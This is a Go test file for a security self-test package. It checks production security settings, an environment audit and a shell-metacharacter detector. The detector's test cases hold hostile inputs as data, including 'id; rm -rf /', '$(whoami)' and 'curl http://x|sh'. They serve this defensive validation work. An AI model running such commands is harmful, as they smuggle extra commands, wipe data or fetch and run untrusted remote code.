package security

import (
	"os"
	"testing"

	"github.com/butbeautifulv/veil/engage/serve/internal/config"
)

func TestSelfTest_cleanProdConfig(t *testing.T) {
	sec := config.SecurityConfig{
		RequireAuth:       true,
		MCPHTTPAuthStrict: true,
		Prod:              true,
		AllowRawCommand:   false,
	}
	findings := RunSelfTest(sec, true)
	if err := FailOn(findings, SeverityHigh); err != nil {
		t.Fatal(err)
	}
}

func TestSelfTest_detectsRawInProd(t *testing.T) {
	sec := config.SecurityConfig{Prod: true, AllowRawCommand: true}
	findings := AuditSecurityConfig(sec, true)
	if err := FailOn(findings, SeverityHigh); err == nil {
		t.Fatal("expected high finding for raw in prod")
	}
}

func TestAuditProcessEnv_prodLocalRunner_noLocalRunnerFinding(t *testing.T) {
	findings := auditProcessEnv(func(k string) string {
		switch k {
		case "ENGAGE_ENV":
			return "prod"
		case "ENGAGE_RUNNER_MODE":
			return "local"
		default:
			return ""
		}
	})
	for _, f := range findings {
		if f.ID == "local-runner-in-prod" {
			t.Fatalf("unexpected finding %s (local runner in prod is allowed under client-native execution profile)", f.ID)
		}
	}
}

func TestContainsShellMetacharacters(t *testing.T) {
	cases := []struct {
		in   string
		want bool
	}{
		{"nmap -sV 10.0.0.1", false},
		{"id; rm -rf /", true},
		{"$(whoami)", true},
		{"curl http://x|sh", true},
	}
	for _, tc := range cases {
		if got := ContainsShellMetacharacters(tc.in); got != tc.want {
			t.Errorf("%q: got %v want %v", tc.in, got, tc.want)
		}
	}
}

func TestRunSelfTest_withCurrentEnv(t *testing.T) {
	// Safe on developer machine: only reports misconfig, never executes attacks.
	sec := config.LoadSecurityForEnv(os.Getenv("ENGAGE_ENV"))
	auth := os.Getenv("AUTH_ENABLED") == "1"
	findings := RunSelfTest(sec, auth)
	t.Log(FormatReport(findings))
	// CI/dev may have findings; never fail test unless ENGAGE_HARDENING_SELFTEST_STRICT=1
	if os.Getenv("ENGAGE_HARDENING_SELFTEST_STRICT") == "1" {
		if err := FailOn(findings, SeverityHigh); err != nil {
			t.Fatal(err)
		}
	}
}
